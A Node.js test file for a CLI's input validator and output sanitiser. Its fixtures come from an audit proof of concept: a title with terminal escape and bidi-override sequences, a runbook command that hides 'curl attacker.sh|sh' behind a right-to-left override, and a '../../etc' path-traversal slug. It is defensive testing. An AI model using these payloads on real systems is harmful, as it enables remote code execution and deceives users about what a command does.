import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateExplainer } from '../scripts/lib/validate.mjs';
import { oneLine, terminalSafe, jsonSafe } from '../scripts/lib/cli/io.mjs';

const example = JSON.parse(readFileSync(new URL('../examples/taskflow.explainer.json', import.meta.url), 'utf8'));
const CLI = fileURLToPath(new URL('../bin/concept-explainer.mjs', import.meta.url));
// From the audit PoC: a title that rewrites the terminal title, erases the
// line and flips text direction, and a runbook command hiding a pipe to sh.
const EVIL_TITLE = 'Totally safe\u001b]0;pwned\u0007\u001b[2K\rINJECTED LINE ‮gnp.exe';
const EVIL_COMMAND = 'echo safe ‮; curl attacker.sh|sh #';
const UNSAFE = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f​-‏‪-‮⁦-⁩]/;

const errorsFor = (mutate) => {
  const data = structuredClone(example);
  mutate(data);
  return validateExplainer(data).errors;
};

test('control, bidi and zero-width characters are errors in every string', () => {
  const cases = [
    ['meta.title', (d) => { d.meta.title = EVIL_TITLE; }],
    ['runbook[0].command', (d) => { d.runbook[0].command = EVIL_COMMAND; }],
    ['nodes[1].id', (d) => { d.nodes[1].id = 'we​b'; }],
    ['nodes[1].summary', (d) => { d.nodes[1].summary = 'Fine\u0085text.'; }],
    ['glossary[0].term', (d) => { d.glossary[0].term = 'Opt⁦imistic'; }],
    ['flows[0].steps[0].file', (d) => { d.flows[0].steps[0].file = 'a.ts\n:12'; }],
    ['nodes[1].summary', (d) => { d.nodes[1].summary = 'Line one\r\nline two.'; }],
  ];
  cases.forEach(([path, mutate]) => {
    const errors = errorsFor(mutate);
    assert.ok(errors.some((e) => e.startsWith(path) && /control|invisible/.test(e)), `${path}: ${errors.join(' | ')}`);
  });
});

test('newlines and tabs stay allowed in prose and code', () => {
  assert.deepEqual(errorsFor((d) => {
    d.nodes[1].summary = 'Line one.\nLine two.';
    d.flows[0].steps[1].code = 'if (x) {\n\treturn 1;\n}';
  }), []);
});

test('terminal output replaces control and invisible characters', () => {
  assert.equal(terminalSafe('ok\n\tnext'), 'ok\n\tnext');
  const safe = terminalSafe(EVIL_TITLE);
  assert.doesNotMatch(safe, UNSAFE);
  assert.match(safe, /�/);
  assert.equal(oneLine('a\nb\tc\u001bd'), 'a b c�d');
  const json = jsonSafe({ t: '‮\u001b' });
  assert.doesNotMatch(json, UNSAFE);
  assert.deepEqual(JSON.parse(json), { t: '‮\u001b' }, 'JSON output keeps the data, escaped');
});

test('importing the PoC bundle rejects it and prints nothing that drives the terminal', () => {
  const root = mkdtempSync(join(tmpdir(), 'rx-hostile-'));
  const evil = structuredClone(example);
  evil.meta.title = EVIL_TITLE;
  evil.runbook = [{ label: 'Setup', command: EVIL_COMMAND, note: 'n' }];
  const file = join(root, 'evil.explainers.json');
  writeFileSync(file, JSON.stringify({ format: 'concept-explainer-bundle', version: 1, explainers: [{ slug: '../../etc', data: evil }] }));
  const env = { ...process.env, HOME: root, CONCEPT_EXPLAINER_HOME: join(root, 'home'), CLAUDE_CONFIG_DIR: join(root, 'claude') };
  const result = spawnSync(process.execPath, [CLI, 'import', file], { env, encoding: 'utf8' });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /0 added, 0 replaced, 0 skipped, 1 rejected/);
  assert.doesNotMatch(result.stdout + result.stderr, UNSAFE);
  const validate = spawnSync(process.execPath, [CLI, 'validate', join(root, 'evil.json')], { env, encoding: 'utf8' });
  writeFileSync(join(root, 'evil.json'), JSON.stringify(evil));
  const checked = spawnSync(process.execPath, [CLI, 'validate', join(root, 'evil.json')], { env, encoding: 'utf8' });
  assert.equal(checked.status, 1);
  assert.doesNotMatch(checked.stdout + checked.stderr + validate.stderr, UNSAFE);
});
